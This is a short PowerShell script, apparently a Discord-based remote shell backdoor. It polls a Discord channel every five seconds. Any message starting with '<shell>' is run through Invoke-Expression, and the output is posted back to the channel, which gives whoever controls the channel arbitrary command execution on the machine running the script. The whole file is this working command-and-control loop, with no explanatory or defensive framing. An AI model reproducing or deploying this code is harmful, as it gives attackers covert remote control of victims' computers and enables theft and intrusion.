$url = ""
$discordToken = ""

$headers = @{
    Authorization = $discordToken
}

while ($true) {
    Start-Sleep -Seconds 5

    $response = Invoke-WebRequest -Uri ($url + "?limit=1") -Headers $headers

    if ($response.StatusCode -eq 200) {
        $messageData = $response.Content | ConvertFrom-Json

        if ($messageData[0].content -like "<shell>*") {
            $shellCommand = $messageData[0].content.Substring(7)
            
            Try {
                $result = Invoke-Expression $shellCommand 2>&1 | Out-String;

                $body = @{
                    "content" = $result
                }
        
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"

            } catch {
                $body = @{
                    "content" = "too long message or command errror"
                }
        
                $bodyJson = $body | ConvertTo-Json
                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
            }
        }
    }
}
